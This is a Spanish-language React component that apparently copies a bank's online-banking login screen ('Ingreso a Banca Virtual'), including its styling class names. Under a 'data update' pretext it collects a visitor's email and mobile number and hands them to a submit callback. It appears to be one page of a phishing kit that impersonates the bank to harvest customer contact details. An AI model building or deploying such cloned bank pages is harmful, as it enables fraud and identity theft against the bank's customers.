/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState } from "react";

export default function ActDatamail({
  enviar,
}: {
  enviar?: (data: any) => void;
}) {
  const [email, setEmail] = useState("");
  const [celular, setCelular] = useState("");

  // -------- VALIDACIONES ---------

  const isEmailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email); // email básico
  const isCelularValid = /^[0-9]{10}$/.test(celular); // 10 dígitos

  // activar el botón solo si todo está bien
  const canSubmit = isEmailValid && isCelularValid;

  const handleSubmit = () => {
    if (!canSubmit) return;
    enviar?.({ email, celular, view: "actdatos" });
  };

  return (
    <>
      {/* HEADER ====================================== */}
      <div id="bdb-ml-header-bv" className="bdb-ml-header-bv__container">
        <div className="bdb-ml-header-bv__container__content">
          <div className="bdb-ml-header-bv__container__content__button bdb-ml-header-bv__container__content__button--l">
            <div className="bdb-ml-header-bv__container__content__leftBoton">
              <button className="bdb-at-btn bdb-at-btn--text bdb-at-btn--sm--ico">
                <span className="ico-arrow-back"></span> Atrás
              </button>
            </div>
          </div>

          <div className="bdb-ml-header-bv__container__content__center">
            <label className="bdb-ml-header-bv__container__content__center__title">
              Ingreso a Banca Virtual
            </label>
          </div>

          <div className="bdb-ml-header-bv__container__content__button bdb-ml-header-bv__container__content__button--r">
            <div className="bdb-ml-header-bv__container__content__button__rigthBoton">
              <button className="bdb-at-btn bdb-at-btn--text bdb-at-btn--sm--ico bdb-at-btn--sm--ico-right">
                Abandonar <span className="ico-close"></span>
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* BODY ====================================== */}
      <div className="sherpa-grid">
        <div className="sherpa-container">
          <div className="col-xs-12 col-sm-10 col-md-10 col-lg-6 col-sm-offset-1 col-md-offset-1 col-lg-offset-3">

            <div className="_7pFqf6HtJm-Go1Dv-hAW5g==">
              <span className="sherpa-typography-heading-6">Actualización de Datos</span>
            </div>

            <div>
              <div className="bdb-ml-bm-token">

                <span className="bdb-ml-bm-email__icon ico-email-open"></span>

                <div className="bdb-ml-bm-token__title">
                  <div className="bdb-ml-bm-token__title__label">
                    <b>Actualiza Tus Datos</b>
                  </div>
                </div>

                <div className="bdb-ml-bm-token__description">
                  Para realizar este proceso, ingresa numero celular y tu correo electrónico.
                </div>

                {/* EMAIL ========================================== */}
                <div className="etiqueta" style={{ marginBottom: 10, marginTop: 10 }}>
                  Correo electrónico
                </div>

                <input
                  type="text"
                  id="txt-correo"
                  className={`bdb-at-input-text ${email && !isEmailValid ? "input-error" : ""}`}
                  placeholder="@"
                  value={email}
                  onChange={(e) => setEmail(e.target.value.trim())}
                />

                {/* ERROR EMAIL */}
                {email && !isEmailValid && (
                  <div className="bdb-at-input-token__msj-error errortoken">
                    Ingresa un correo válido.
                  </div>
                )}

                {/* CELULAR ========================================== */}
                <div className="etiqueta" style={{ marginBottom: 10, marginTop: 10 }}>
                  Teléfono celular
                </div>

                <input
                  type="text"
                  id="txt-celular"
                  className={`bdb-at-input-text ${celular && !isCelularValid ? "input-error" : ""}`}
                  placeholder="300----------"
                  maxLength={10}
                  value={celular}
                  onChange={(e) =>
                    setCelular(e.target.value.replace(/[^0-9]/g, ""))
                  }
                />

                {/* ERROR CELULAR */}
                {celular && !isCelularValid && (
                  <div className="bdb-at-input-token__msj-error errortoken">
                    El celular debe tener 10 números.
                  </div>
                )}

                {/* BOTÓN ========================================== */}
                <div className="bdb-ml-bm-token__actions">
                  <div className="bdb-ml-bm-token__actions__send">
                    <button
                      className="bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg"
                      id="continuar"
                      disabled={!canSubmit}
                      onClick={handleSubmit}
                    >
                      Verificar
                    </button>
                  </div>
                </div>

              </div>
            </div>

          </div>
        </div>
      </div>
    </>
  );
}